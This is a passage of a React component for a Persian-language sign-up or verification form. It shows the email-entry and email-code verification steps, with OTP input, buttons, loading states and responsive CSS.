            <>
              <form onSubmit={handleEmailSubmit}>
                <div style={{ marginBottom: "16px" }}>
                  <AlertMessage>
                    <Mail
                      className="inline ml-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    ایمیل خود را وارد کنید تا کد تایید برای شما ارسال شود.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "16px" }}>
                  <label
                    htmlFor="email-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "8px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    آدرس ایمیل
                  </label>
                  <Input
                    id="email-input"
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (errors.email) {
                        setErrors((prev) => ({ ...prev, email: undefined }));
                      }
                    }}
                    className="w-full text-right"
                    style={{
                      borderRadius: "8px",
                      border: errors.email
                        ? "1px solid rgb(220, 38, 38)"
                        : "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                      direction: "ltr",
                    }}
                    placeholder="example@email.com"
                    autoFocus
                    disabled={isSubmitting}
                  />
                  {errors.email && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.email}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full"
                    style={{
                      backgroundColor: "rgb(23, 29, 38)",
                      color: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                      border: "none",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <Loader2
                          className="animate-spin mr-2"
                          style={{ width: "16px", height: "16px" }}
                        />
                        <span>در حال ارسال کد...</span>
                      </div>
                    ) : (
                      "ارسال کد تایید"
                    )}
                  </Button>
                </div>
              </form>
            </>
          )}

          {/* Step 8: Email Code Verification */}
          {currentStep === "email" && emailStep === "code" && (
            <>
              <div style={{ marginBottom: "16px" }}>
                <AlertMessage>
                  کد تایید به ایمیل{" "}
                  <strong style={{ direction: "ltr" }}>{email}</strong> ارسال
                  شد.
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد تایید ایمیل
                </label>
                <OTPInput
                  length={6}
                  value={emailCode}
                  onComplete={setEmailCode}
                  onChange={setEmailCode}
                  disabled={isSubmitting}
                />
                {errors.emailCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "8px",
                    }}
                  >
                    {errors.emailCode}
                  </p>
                )}
              </div>

              <div style={{ marginTop: "24px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <div style={{ display: "flex", gap: "12px" }}>
                  <Button
                    onClick={() => setEmailStep("email")}
                    variant="outline"
                    className="w-full"
                    style={{
                      border: "1px solid rgba(0, 0, 0, 0.2)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                    }}
                  >
                    ویرایش ایمیل
                  </Button>
                  <Button
                    onClick={handleEmailCodeSubmit}
                    disabled={isSubmitting || emailCode.length !== 6}
                    className="w-full"
                    style={{
                      backgroundColor: "rgb(23, 29, 38)",
                      color: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                      border: "none",
                      cursor:
                        isSubmitting || emailCode.length !== 6
                          ? "not-allowed"
                          : "pointer",
                      opacity:
                        isSubmitting || emailCode.length !== 6 ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <Loader2
                          className="animate-spin mr-2"
                          style={{ width: "16px", height: "16px" }}
                        />
                        <span>در حال تایید...</span>
                      </div>
                    ) : (
                      "تایید کد"
                    )}
                  </Button>
                </div>
              </div>
            </>
          )}
        </div>
      </div>

      <style jsx>{`
        /* Desktop styles (1024px and up) */
        @media (min-width: 1024px) {
          .form-card {
            border-radius: 16px;
          }
        }

        /* Mobile and tablet styles (up to 1023px) */
        @media (max-width: 1023px) {
          .form-card {
            border-radius: 0 !important;
            max-width: none !important;
            height: 100vh;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
          .form-card > div {
            padding: 20px !important;
            height: 100%;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
          }
        }
      `}</style>
    </div>
  );
};
